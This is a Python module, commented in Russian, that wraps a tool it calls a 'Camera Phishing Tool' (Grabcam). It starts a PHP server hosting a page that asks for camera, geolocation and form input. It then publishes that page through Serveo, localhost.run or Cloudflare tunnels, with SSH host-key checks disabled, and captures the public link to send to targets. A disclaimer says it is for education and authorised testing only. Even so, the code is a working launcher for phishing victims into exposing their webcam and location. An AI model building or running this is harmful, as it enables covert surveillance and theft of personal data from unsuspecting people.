"""
Инструмент Grabcam: тестирование доступа к веб-камере (Camera Phishing Tool).
Запуск PHP-сервера и туннеля Serveo или только локального PHP-сервера.
Только для образовательных целей и тестирования с разрешения.
"""
import os
import re
import shutil
import signal
import subprocess
import threading
import time
from typing import Any

from .base import ToolBase

_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
_GRABCAM_DIR = os.path.join(_PROJECT_ROOT, "tools", "grabcam")
_OPTIONS_FILE = os.path.join(_GRABCAM_DIR, "options.json")

_DEFAULT_FEATURES = {"camera": True, "geo": True, "form": True, "gallery": False}
_SCRIPT = os.path.join(_GRABCAM_DIR, "grabcam.sh")
_SENDLINK = os.path.join(_GRABCAM_DIR, "sendlink")
_PHP_PORT = 3333

# Паттерны ссылок туннелей
_SERVEO_LINK_RE = re.compile(
    r"https://[0-9a-zA-Z\-]+\.(?:serveo\.net|serveousercontent\.com)",
    re.IGNORECASE,
)
_LOCALHOST_RUN_LINK_RE = re.compile(
    r"https://[0-9a-zA-Z\-]+\.lhr\.life",
    re.IGNORECASE,
)
_CLOUDFLARE_LINK_RE = re.compile(
    r"https://[0-9a-zA-Z\-]+\.trycloudflare\.com",
    re.IGNORECASE,
)

_state = {"proc": None, "proc_ssh": None, "proc_cloudflared": None, "link": None, "local_url": None, "running": False, "error": None}
_lock = threading.Lock()


def _php_available() -> bool:
    """Проверка наличия PHP в системе."""
    return shutil.which("php") is not None


def _ssh_available() -> bool:
    """Проверка наличия SSH в системе (Serveo, localhost.run)."""
    return shutil.which("ssh") is not None


def _cloudflared_available() -> bool:
    """Проверка наличия cloudflared (Cloudflare Tunnel)."""
    return shutil.which("cloudflared") is not None


def _port_in_use(port: int) -> bool:
    """Проверка, занят ли порт (упрощённо)."""
    try:
        import socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            return s.connect_ex(("127.0.0.1", port)) == 0
    except Exception:
        return False


def _extract_serveo_link(text: str) -> str | None:
    """Извлекает ссылку Serveo из текста (serveo.net или serveousercontent.com)."""
    m = _SERVEO_LINK_RE.search(text)
    return m.group(0) if m else None


def _read_link_from_file() -> str | None:
    """Читает ссылку Serveo из файла sendlink (для совместимости со скриптом)."""
    if not os.path.isfile(_SENDLINK):
        return None
    try:
        with open(_SENDLINK, "r", encoding="utf-8", errors="replace") as f:
            text = f.read()
        return _extract_serveo_link(text)
    except OSError:
        return None


def _worker_serveo():
    """Запуск Serveo без интерактивного скрипта: PHP на 3333 + SSH туннель, парсинг ссылки из вывода SSH."""
    with _lock:
        _state["running"] = True
        _state["link"] = None
        _state["error"] = None
        _state["proc"] = None
        _state["proc_ssh"] = None
        _state["local_url"] = None

    proc_php = None
    proc_ssh = None
    link = None

    try:
        # 1) Запуск PHP-сервера в grabcam
        proc_php = subprocess.Popen(
            ["php", "-S", f"127.0.0.1:{_PHP_PORT}"],
            cwd=_GRABCAM_DIR,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        with _lock:
            _state["proc"] = proc_php
        time.sleep(0.8)
        if proc_php.poll() is not None:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = "PHP-сервер не запустился. Проверьте порт 3333 и наличие PHP."
            return

        # 2) Генерация index2.html с плейсхолдером (ссылка подставится после получения)
        _ensure_serveo_payload_ready()

        # 3) Запуск SSH туннеля Serveo (сначала порт 22, при недоступности — 443)
        ssh_opts = [
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ServerAliveInterval=60",
            "-o", "ConnectTimeout=15",
            "-R", "80:127.0.0.1:3333",
            "serveo.net",
        ]
        for ssh_port in (22, 443):
            cmd = (["ssh", "-p", "443"] if ssh_port == 443 else ["ssh"]) + ssh_opts
            try:
                proc_ssh = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    bufsize=1,
                    start_new_session=True,
                )
            except FileNotFoundError:
                with _lock:
                    _state["running"] = False
                    _state["proc"] = None
                    _state["error"] = "SSH не найден. Установите openssh-client (apt install openssh-client)."
                return
            except Exception as e:
                with _lock:
                    _state["error"] = str(e)
                continue

            with _lock:
                _state["proc_ssh"] = proc_ssh

            # Читаем вывод SSH до появления ссылки или таймаута (25 сек)
            deadline = time.monotonic() + 25
            buf = []
            while time.monotonic() < deadline:
                if proc_ssh.poll() is not None:
                    break
                line = proc_ssh.stdout.readline()
                if not line:
                    time.sleep(0.3)
                    continue
                buf.append(line)
                link = _extract_serveo_link(line)
                if link:
                    break
            if not link and buf:
                link = _extract_serveo_link("".join(buf))
            if link:
                with _lock:
                    _state["link"] = link
                _update_serveo_payload_link(link)
                return
            # SSH завершился без ссылки или таймаут — пробуем порт 443
            try:
                if proc_ssh.poll() is None:
                    proc_ssh.terminate()
                    time.sleep(1)
                    if proc_ssh.poll() is None:
                        proc_ssh.kill()
            except Exception:
                pass
            proc_ssh = None
            with _lock:
                _state["proc_ssh"] = None

        with _lock:
            _state["error"] = (
                "Serveo недоступен (часто в РФ или за фаерволом). Выберите в списке метод «localhost.run» или «Cloudflare Tunnel» — они обычно работают."
            )
            _state["running"] = False
            _state["proc"] = None
            _state["proc_ssh"] = None
        if proc_ssh and proc_ssh.poll() is None:
            try:
                proc_ssh.terminate()
            except Exception:
                pass
        if proc_php and proc_php.poll() is None:
            try:
                proc_php.terminate()
            except Exception:
                pass
    except Exception as e:
        with _lock:
            _state["error"] = str(e)
            _state["running"] = False
            _state["proc"] = None
            _state["proc_ssh"] = None
        for p in (proc_ssh, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass


def _worker_localhost_run():
    """Туннель localhost.run (SSH). Часто работает там, где Serveo недоступен (в т.ч. РФ)."""
    with _lock:
        _state["running"] = True
        _state["link"] = None
        _state["error"] = None
        _state["proc"] = None
        _state["proc_ssh"] = None
        _state["local_url"] = None

    proc_php = None
    proc_ssh = None
    link = None
    try:
        proc_php = subprocess.Popen(
            ["php", "-S", f"127.0.0.1:{_PHP_PORT}"],
            cwd=_GRABCAM_DIR,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        with _lock:
            _state["proc"] = proc_php
        time.sleep(0.8)
        if proc_php.poll() is not None:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = "PHP-сервер не запустился."
            return
        _ensure_serveo_payload_ready()
        cmd = [
            "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ServerAliveInterval=60", "-o", "ConnectTimeout=20",
            "-R", "80:127.0.0.1:3333", "nokey@localhost.run",
        ]
        try:
            proc_ssh = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                start_new_session=True,
            )
        except FileNotFoundError:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = "SSH не найден. Установите openssh-client."
            return
        with _lock:
            _state["proc_ssh"] = proc_ssh
        deadline = time.monotonic() + 30
        buf = []
        while time.monotonic() < deadline:
            if proc_ssh.poll() is not None:
                break
            line = proc_ssh.stdout.readline()
            if not line:
                time.sleep(0.3)
                continue
            buf.append(line)
            link = _LOCALHOST_RUN_LINK_RE.search(line)
            if link:
                link = link.group(0)
                break
        if not link and buf:
            m = _LOCALHOST_RUN_LINK_RE.search("".join(buf))
            link = m.group(0) if m else None
        if link:
            with _lock:
                _state["link"] = link
            _update_serveo_payload_link(link)
            return
        with _lock:
            _state["error"] = "Не удалось получить ссылку localhost.run. Проверьте интернет и доступность localhost.run."
            _state["running"] = False
            _state["proc"] = None
            _state["proc_ssh"] = None
        for p in (proc_ssh, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass
    except Exception as e:
        with _lock:
            _state["error"] = str(e)
            _state["running"] = False
            _state["proc"] = None
            _state["proc_ssh"] = None
        for p in (proc_ssh, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass


def _worker_cloudflared():
    """Cloudflare Quick Tunnel — часто доступен в РФ, не требует SSH."""
    with _lock:
        _state["running"] = True
        _state["link"] = None
        _state["error"] = None
        _state["proc"] = None
        _state["proc_ssh"] = None
        _state["proc_cloudflared"] = None
        _state["local_url"] = None

    proc_php = None
    proc_cf = None
    link = None
    try:
        proc_php = subprocess.Popen(
            ["php", "-S", f"127.0.0.1:{_PHP_PORT}"],
            cwd=_GRABCAM_DIR,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        with _lock:
            _state["proc"] = proc_php
        time.sleep(0.8)
        if proc_php.poll() is not None:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = "PHP-сервер не запустился."
            return
        _ensure_serveo_payload_ready()
        try:
            proc_cf = subprocess.Popen(
                ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{_PHP_PORT}"],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                start_new_session=True,
            )
        except FileNotFoundError:
            with _lock:
                _state["running"] = False
                _state["proc"] = None
                _state["error"] = "cloudflared не найден. Установите: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/"
            return
        with _lock:
            _state["proc_cloudflared"] = proc_cf
        deadline = time.monotonic() + 25
        buf = []
        while time.monotonic() < deadline:
            if proc_cf.poll() is not None:
                break
            line = proc_cf.stdout.readline()
            if not line:
                time.sleep(0.3)
                continue
            buf.append(line)
            m = _CLOUDFLARE_LINK_RE.search(line)
            if m:
                link = m.group(0)
                break
        if not link and buf:
            m = _CLOUDFLARE_LINK_RE.search("".join(buf))
            link = m.group(0) if m else None
        if link:
            with _lock:
                _state["link"] = link
            _update_serveo_payload_link(link)
            return
        with _lock:
            _state["error"] = "Не удалось получить ссылку Cloudflare. Проверьте интернет."
            _state["running"] = False
            _state["proc"] = None
            _state["proc_cloudflared"] = None
        for p in (proc_cf, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass
    except Exception as e:
        with _lock:
            _state["error"] = str(e)
            _state["running"] = False
            _state["proc"] = None
            _state["proc_cloudflared"] = None
        for p in (proc_cf, proc_php):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass


def _get_features_json() -> str:
    """Читает options.json и возвращает JSON-строку для подстановки GRABCAM_FEATURES_JSON."""
    import json
    features = dict(_DEFAULT_FEATURES)
    if os.path.isfile(_OPTIONS_FILE):
        try:
            with open(_OPTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            for k in features:
                if k in data and isinstance(data[k], bool):
                    features[k] = data[k]
        except (OSError, ValueError):
            pass
    return json.dumps(features, ensure_ascii=False)


def _refresh_payload(link: str = "http://127.0.0.1:3333") -> None:
    """Обновляет index2.html и index.html из grabcam.html — одна ссылка (/) отдаёт страницу с формой и камерой."""
    html_tpl = os.path.join(_GRABCAM_DIR, "grabcam.html")
    index2 = os.path.join(_GRABCAM_DIR, "index2.html")
    index_main = os.path.join(_GRABCAM_DIR, "index.html")
    if not os.path.isfile(html_tpl):
        return
    try:
        with open(html_tpl, "r", encoding="utf-8", errors="replace") as f:
            content = f.read()
        content = content.replace("forwarding_link", link).replace("GRABCAM_FEATURES_JSON", _get_features_json())
        with open(index2, "w", encoding="utf-8") as f:
            f.write(content)
        with open(index_main, "w", encoding="utf-8") as f:
            f.write(content)
    except OSError:
        pass


def _ensure_serveo_payload_ready() -> None:
    """Создаёт/обновляет index2.html и index.php с плейсхолдером и текущими опциями."""
    _refresh_payload("http://127.0.0.1:3333")
    tpl_php = os.path.join(_GRABCAM_DIR, "template.php")
    index_php = os.path.join(_GRABCAM_DIR, "index.php")
    if os.path.isfile(tpl_php):
        try:
            with open(tpl_php, "r", encoding="utf-8", errors="replace") as f:
                content = f.read().replace("forwarding_link", "http://127.0.0.1:3333")
            with open(index_php, "w", encoding="utf-8") as f:
                f.write(content)
        except OSError:
            pass


def _update_serveo_payload_link(link: str) -> None:
    """Подставляет полученную ссылку туннеля в index2.html, index.html и index.php."""
    _refresh_payload(link)
    tpl_php = os.path.join(_GRABCAM_DIR, "template.php")
    index_php = os.path.join(_GRABCAM_DIR, "index.php")
    if os.path.isfile(tpl_php):
        try:
            with open(tpl_php, "r", encoding="utf-8", errors="replace") as f:
                content = f.read().replace("forwarding_link", link)
            with open(index_php, "w", encoding="utf-8") as f:
                f.write(content)
        except OSError:
            pass
    if os.path.isfile(tpl_php):
        try:
            with open(tpl_php, "r", encoding="utf-8", errors="replace") as f:
                content = f.read().replace("forwarding_link", link)
            with open(index_php, "w", encoding="utf-8") as f:
                f.write(content)
        except OSError:
            pass


def _worker_php_only(port: int = _PHP_PORT):
    """Только PHP-сервер в папке grabcam."""
    with _lock:
        _state["running"] = True
        _state["local_url"] = f"http://127.0.0.1:{port}"
        _state["error"] = None
        _state["proc"] = None
        _state["link"] = None
    proc = None
    try:
        proc = subprocess.Popen(
            ["php", "-S", f"0.0.0.0:{port}"],
            cwd=_GRABCAM_DIR,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        with _lock:
            _state["proc"] = proc
        proc.wait()
    except Exception as e:
        with _lock:
            _state["error"] = str(e)
    finally:
        with _lock:
            _state["running"] = False
            _state["proc"] = None


class ToolGrabcam(ToolBase):
    @property
    def tool_id(self) -> str:
        return "grabcam"

    @property
    def name(self) -> str:
        return "Grabcam"

    @property
    def description(self) -> str:
        return "Тестирование доступа к веб-камере по ссылке. Только для образования и тестирования с явного разрешения."

    def run(self, params: dict[str, Any]) -> dict[str, Any]:
        import json
        method = (params.get("method") or "php_only").strip().lower()
        if method not in ("serveo", "php_only", "localhost_run", "cloudflared"):
            method = "php_only"
        options = {
            "camera": bool(params.get("camera", True)),
            "geo": bool(params.get("geo", True)),
            "form": bool(params.get("form", True)),
            "gallery": bool(params.get("gallery", False)),
        }
        try:
            with open(_OPTIONS_FILE, "w", encoding="utf-8") as f:
                json.dump(options, f, ensure_ascii=False, indent=2)
        except OSError:
            pass
        _refresh_payload("http://127.0.0.1:3333")

        with _lock:
            _state["error"] = None
            if _state.get("running"):
                return {"success": False, "error": "Сервер уже запущен. Сначала нажмите «Остановить»."}

        if not _php_available():
            return {"success": False, "error": "PHP не найден. Установите PHP (apt install php, dnf install php и т.д.)."}

        if method == "php_only":
            if not os.path.isdir(_GRABCAM_DIR):
                return {"success": False, "error": "Папка не найдена: tools/grabcam"}
            port = _PHP_PORT
            if _port_in_use(port):
                return {"success": False, "error": f"Порт {port} занят. Остановите другой сервер или выберите туннель."}
            thread = threading.Thread(target=_worker_php_only, args=(port,), daemon=True)
            thread.start()
            time.sleep(0.5)
            with _lock:
                return {
                    "success": True,
                    "started": True,
                    "local_url": _state.get("local_url") or f"http://127.0.0.1:{port}",
                    "message": "PHP-сервер запущен. Откройте ссылку в браузере — страница запросит доступ к камере.",
                }
        elif method == "cloudflared":
            if not _cloudflared_available():
                return {"success": False, "error": "cloudflared не найден. Скачайте: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/ (часто работает в РФ)."}
            if _port_in_use(_PHP_PORT):
                return {"success": False, "error": f"Порт {_PHP_PORT} занят."}
            thread = threading.Thread(target=_worker_cloudflared, daemon=True)
            thread.start()
            return {"success": True, "started": True, "message": "Запуск PHP и Cloudflare Tunnel… Ссылка появится через 5–15 сек."}
        else:
            # serveo или localhost_run — нужен SSH
            if not _ssh_available():
                return {"success": False, "error": "SSH не найден. Установите openssh-client (apt install openssh-client)."}
            if _port_in_use(_PHP_PORT):
                return {"success": False, "error": f"Порт {_PHP_PORT} занят."}
            if method == "localhost_run":
                thread = threading.Thread(target=_worker_localhost_run, daemon=True)
                thread.start()
                return {"success": True, "started": True, "message": "Запуск PHP и localhost.run… Ссылка появится через 10–30 сек. (рекомендуется для РФ.)"}
            else:
                thread = threading.Thread(target=_worker_serveo, daemon=True)
                thread.start()
                return {"success": True, "started": True, "message": "Запуск PHP и Serveo… Ссылка появится через 10–25 сек."}

    def stop_run(self) -> tuple[bool, str]:
        with _lock:
            proc = _state.get("proc")
            proc_ssh = _state.get("proc_ssh")
            proc_cf = _state.get("proc_cloudflared")
            if not proc and not proc_ssh and not proc_cf:
                return False, "Ничего не запущено."
            _state["proc"] = None
            _state["proc_ssh"] = None
            _state["proc_cloudflared"] = None
        def kill_process(p):
            if p is None:
                return
            try:
                if hasattr(os, "killpg") and p.pid:
                    try:
                        pgid = os.getpgid(p.pid)
                        os.killpg(pgid, signal.SIGKILL)
                    except (ProcessLookupError, OSError):
                        try:
                            p.kill()
                        except Exception:
                            pass
                else:
                    p.kill()
            except ProcessLookupError:
                pass
            except Exception:
                try:
                    p.terminate()
                except Exception:
                    pass
        kill_process(proc_ssh)
        kill_process(proc_cf)
        kill_process(proc)
        with _lock:
            _state["running"] = False
            _state["link"] = None
            _state["local_url"] = None
            _state["error"] = None
        return True, "Остановлено."

    def get_run_status(self) -> dict:
        with _lock:
            link = _state.get("link")
            local_url = _state.get("local_url")
            running = _state.get("running", False)
            err = _state.get("error")
        if not running and not link and not local_url:
            return {"running": False, "link": None, "local_url": None, "error": err}
        return {
            "running": running,
            "link": link,
            "local_url": local_url,
            "error": err,
        }
